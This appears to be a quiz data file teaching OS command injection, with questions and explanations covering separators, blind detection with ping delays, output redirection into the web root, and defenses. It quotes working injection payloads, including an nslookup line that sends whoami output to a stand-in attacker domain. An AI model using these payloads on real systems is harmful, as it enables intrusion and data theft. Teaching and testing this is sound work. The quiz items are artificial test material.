questions.q: What is the other common name for OS command injection?
questions.explain: OS command injection is also known as shell injection.

questions.q: A successful OS command injection attack typically lets an attacker fully compromise the application and its data, and can be leveraged to pivot to other systems in the organization.
questions.explain: It allows execution of OS commands on the server, often fully compromising the app and its data and enabling pivots to other systems by exploiting trust relationships.

questions.q: In the stock-checking example, the app calls out to a shell command with user-supplied product and store IDs. Which input, submitted in the productID parameter, executes an arbitrary command?
questions.explain: The & is a shell command separator, so the input runs an injected echo command between the original command and its arguments.

questions.q: Why is the echo command useful when testing for OS command injection?
choices: It causes a supplied string to be echoed in the output, confirming the command ran
It opens a reverse shell to the attacker
It escapes any shell metacharacters in the input
It deletes the original command's arguments
questions.explain: echo causes the supplied string to appear in the output, a useful way to test for some types of OS command injection.

questions.q: Why is it useful to place an additional command separator (such as &) AFTER the injected command?
choices: It separates the injected command from whatever follows the injection point, reducing the chance that the following text prevents the injected command from executing
It encrypts the injected command so filters cannot detect it
It forces the server to return the command output in the HTTP response
It is required syntax or the shell throws a fatal error
questions.explain: The trailing separator isolates the injected command from the rest of the original command line, so trailing arguments don't break the injection.

questions.q: Which command returns the name of the current user on BOTH Linux and Windows?
questions.explain: whoami works on both platforms. uname -a / ver report the OS, and ps -ef lists processes on Linux.

questions.q: Which pair correctly gives the 'operating system' command for Linux then Windows?
questions.explain: On Linux use uname -a; on Windows use ver.

questions.q: Which command shows the network configuration on Windows?
questions.explain: Windows uses ipconfig /all; the Linux equivalent is ifconfig.

questions.q: To list running processes, which commands are used on Linux and Windows respectively?
questions.explain: Linux: ps -ef. Windows: tasklist.

questions.q: In a blind OS command injection vulnerability, the application returns the output of the injected command within its HTTP response.
questions.explain: Blind means the application does NOT return the command output in its response, so the echo payload won't work and other techniques are required.

questions.q: Which command is recommended for detecting blind OS command injection via a time delay, because it lets you control how long the command runs?
questions.explain: ping lets you specify the number of ICMP packets (e.g. ping -c 10 127.0.0.1), controlling the response time so you can confirm execution from the delay.

questions.q: The payload '& ping -c 10 127.0.0.1 &' causes the application to ping its loopback adapter for approximately how many seconds?
questions.explain: ping -c 10 sends 10 ICMP packets, causing about a 10-second delay to the loopback adapter.

questions.q: How can you exploit blind OS command injection by redirecting output so you can read it in a browser?
choices: Send the output into a file within the web root (e.g. & whoami > /var/www/static/whoami.txt &), then fetch that file over HTTP
Pipe the output into the ping command
echo the output directly in the HTTP response
Email the output to the site administrator
questions.explain: The > character redirects command output to a file under the web root, which you then retrieve with the browser.

questions.q: Which command would you inject to trigger an out-of-band (OAST) DNS lookup to a domain you control, confirming the injection?
questions.explain: e.g. & nslookup kgji2ohoyw.web-attacker.com & causes a DNS lookup the attacker can monitor to confirm the command ran.

questions.q: What does the out-of-band payload '& nslookup `whoami`.kgji2ohoyw.web-attacker.com &' achieve?
choices: It exfiltrates the whoami result by placing it in the DNS lookup to the attacker's domain
It opens an interactive shell on the attacker's domain
It redirects the whoami output into a file in the web root
questions.explain: The backticks run whoami inline and its result becomes part of the looked-up domain (e.g. wwwuser.kgji2ohoyw.web-attacker.com), exfiltrating the output over DNS.

questions.q: Which of these command separators work on BOTH Windows and Unix-based systems?
questions.explain: &, &&, | and || work on both. The semicolon and newline (0x0a) work only on Unix-based systems.

questions.q: Which command separators work ONLY on Unix-based systems (not Windows)?
questions.explain: The semicolon and a newline character work only on Unix-based systems; & and || work on both.

questions.q: On Unix-based systems, which syntax lets you perform inline execution of an injected command within the original command?
questions.explain: Backticks and $(...) perform inline execution of an injected command on Unix-based systems.

questions.q: If your controlled input appears within quotation marks in the original command, what must you do before injecting a new command?
choices: Terminate the quoted context first using " or '
Convert the input to a number
Add a null byte at the end
questions.explain: You must close the quoted context (with " or ') before using shell metacharacters to inject a new command.

questions.q: What is described as the most effective way to prevent OS command injection vulnerabilities?
choices: Never call out to OS commands from application-layer code; use safer platform APIs instead
Escape all shell metacharacters in user input
Run the application as a non-root user
questions.explain: The most effective defense is to avoid calling OS commands from application code and use safer platform APIs; in almost all cases the functionality can be implemented another way.

questions.q: If you must call OS commands with user input, which of the following are given as examples of effective input validation?
choices: Validating against a whitelist of permitted values
Validating that the input is a number
Validating that the input contains only alphanumeric characters, with no other syntax or whitespace
Escaping shell metacharacters in the input
questions.explain: Whitelisting, requiring a number, and allowing only alphanumeric characters are all recommended. Escaping metacharacters is explicitly discouraged as error-prone and bypassable.

questions.q: Sanitizing input by escaping shell metacharacters is the recommended defense against OS command injection.
questions.explain: You should never rely on escaping shell metacharacters; in practice it is too error-prone and vulnerable to bypass by a skilled attacker.
